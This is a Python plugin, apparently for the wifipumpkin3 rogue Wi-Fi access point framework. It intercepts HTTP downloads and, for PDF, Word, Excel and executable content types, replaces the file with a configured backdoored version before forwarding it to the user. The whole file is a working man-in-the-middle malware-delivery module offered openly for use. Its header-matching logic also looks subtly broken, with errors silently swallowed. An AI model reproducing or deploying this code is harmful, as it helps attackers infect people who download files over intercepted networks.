from wifipumpkin3.plugins.extension.base import BasePumpkin
from os import path


exe_mimetypes = ['application/octet-stream', 'application/x-msdownload', 
'application/exe', 'application/x-exe', 'application/dos-exe', 'vms/exe',
'application/x-winexe', 'application/msdos-windows', 'application/x-msdos-program']

class downSpoof(BasePumpkin):

    meta = {
        '_name'      : 'downSpoof',
        '_version'   : '1.0',
        '_description' : 'replace download content-type for another binary malicius',
        '_author'    : 'Marcos Nesster',
    }

    @staticmethod
    def getName():
        return downSpoof.meta['_name']

    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.payloads = {
        'application/pdf': self._config.get('set_downloadspoof','backdoorPDFpath'),
        'application/msword': self._config.get('set_downloadspoof','backdoorWORDpath'),
        'application/x-msexcel' : self._config.get('set_downloadspoof','backdoorXLSpath'),
        }
        for mime in exe_mimetypes:
            self.payloads[mime] = self._config.get('set_downloadspoof','backdoorExePath')

    def handleResponse(self, request, data):
        try:
            # for another format file types
            content = request.responseHeaders.getRawHeaders('content-type')
            if content in self.payloads:
                if path.isfile(self.payloads[content]):
                    print('[downloadspoof]:: URL: {}'.format(request.uri))
                    print("[downloadspoof]:: Replaced file of mimtype {} with malicious version".format(content))
                    data = open(self.payloads[content],'rb').read()
                    print('[downloadspoof]:: Patching complete, forwarding to user...')
                    return data
                print('[downloadspoof]:: {}, Error Path file not found\n'.format(self.payloads[content]))
        except Exception as e:
            pass


        return data
    
    def handleHeader(self, request, key, value):
        return key, value